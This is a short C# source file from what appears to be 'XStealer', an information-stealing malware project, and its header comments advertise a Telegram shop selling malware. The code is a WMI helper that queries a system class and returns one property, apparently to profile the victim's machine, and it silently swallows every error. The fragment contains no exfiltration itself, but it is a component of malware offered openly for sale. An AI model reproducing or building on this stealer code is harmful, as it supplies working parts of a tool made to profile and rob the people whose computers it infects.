// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System.Management;

    public static class WmiEx
    {
        public static string GetName(string root, string location, string name) // @"root\CIMV2"
        {
            string result = string.Empty;
            try
            {
                using var Secret = new ManagementObjectSearcher(root, $"SELECT * FROM {location}");
                using var ss = Secret.Get();
                foreach (ManagementBaseObject queryObj in ss)
                {
                    result = queryObj[$"{name}"]?.ToString();
                    break;
                }
            }
            catch { }
            return result;
        }
    }
}